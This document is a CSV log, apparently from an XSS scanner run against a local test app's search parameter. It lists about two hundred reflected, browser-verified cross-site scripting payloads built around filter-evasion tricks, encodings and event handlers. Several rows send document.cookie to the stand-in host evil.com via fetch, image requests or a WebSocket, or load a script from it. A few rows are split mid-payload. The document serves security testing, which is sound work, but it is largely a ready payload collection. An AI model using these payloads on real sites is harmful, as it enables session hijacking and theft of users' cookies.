Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div contenteditable onblur=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg><animatemotion onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,﻿<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<button autofocus onfocus=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div contenteditable oninput=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<select><option oninput=alert(1)>X</option></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table><caption onmouseover=alert(1)>X</caption></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<strong onmouseover=alert(1)>X</strong>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<section onmouseover=alert(1)>X</section>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<figcaption onmouseover=alert(1)>X</figcaption>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
